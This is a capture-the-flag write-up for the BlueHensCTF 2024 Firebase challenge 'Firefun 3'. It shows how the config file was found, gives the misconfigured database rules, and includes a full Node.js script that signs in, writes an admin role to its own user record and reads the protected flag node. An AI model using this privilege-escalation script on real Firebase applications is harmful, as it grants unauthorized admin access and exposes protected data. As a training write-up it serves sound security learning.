---
title: "BlueHensCTF 2024 - Firefun 3"
pubDate: "2024-11-10"
description: "CTF challenge writeup."
tags:
  - writeups
  - ctf
  - firebase
  - js
toc: true
math: true
---


We would start with a simple landing page that has nothing in it besides some HTML, the wappalyzer tells us that this is a Firebase application.

In that case we can try to fuzz some firebase specific things, which will lead us to the configuration file:

```
/__/firebase/init.json
```

Now we can quickly craft some enumeration of that application, HOWEVER I've tried with various tools such as:

- [firepwn](https://github.com/0xbigshaq/firepwn-tool)
- [baserunner](https://github.com/iosiro/baserunner)

But for whatever reason they did not work, so I've crafted my own code to do the enumeration in NodeJS. First I wanted to explore the storage, where I found this file `is_this_secure?.png`. Which contains a screenshot of the rules which are:

```json
{
    "rules": {
        "users": {
            "$userid": {
                ".read": "$userid === auth.uid",
                ".write": "$userid === auth.uid"
            }
        },
        "rules": {
            ".read": true,
            ".write": false
        },
        "flag": {
            ".write": false,
            ".read": "root.child('users').child(auth.uid).child('roles').child('admin').exists()"
        }
    }
}
```

We can see that we can uncover the flag node by being an admin. So let's try to set ourselves as admin and get the flag.

```js
import { initializeApp } from "firebase/app";
import { getAuth, signInWithEmailAndPassword  } from "firebase/auth";
import { getDatabase, ref as dbref, update, get } from "firebase/database";

const app = initializeApp({
  "apiKey": "AIzaSyBX_qnDyJ9pl_csJUprUywtAh9lUbVqPFU",
  "authDomain": "udctf24.firebaseapp.com",
  "databaseURL": "https://udctf24-default-rtdb.firebaseio.com",
  "messagingSenderId": "926833250426",
  "projectId": "udctf24",
  "storageBucket": "udctf24.firebasestorage.app"
});

// Initialize Database
const db = getDatabase(app);

// Authenticate and Assign Admin Role
const auth = getAuth();
signInWithEmailAndPassword(auth, "wow@gmail.com", "password")
  .then((userCredential) => {
    // User successfully signed in
    const user = userCredential.user;
    console.log("User logged in:", user.email);

    const uid = user.uid;

    const userRolesRef = dbref(db, `users/${uid}/roles`);

    update(userRolesRef, { admin: true })
      .then(() => {
        console.log("Admin role assigned to user:", uid);

        const flagRef = dbref(db, '/flag');
        get(flagRef)
          .then((snapshot) => {
            if (snapshot.exists()) {
              console.log("Flag data:", snapshot.val());
            } else {
              console.log("No data available at /flag");
            }
          })
          .catch((error) => {
            console.error("Error reading /flag data:", error);
          });
      })
      .catch((error) => {
        console.error("Error assigning admin role:", error);
      });
  })
  .catch((error) => {
    console.error("Error signing in:", error);
  });
```

Which get us the flag:

```
udctf{wh4t_4_sleuth_y0u_4r3!}
```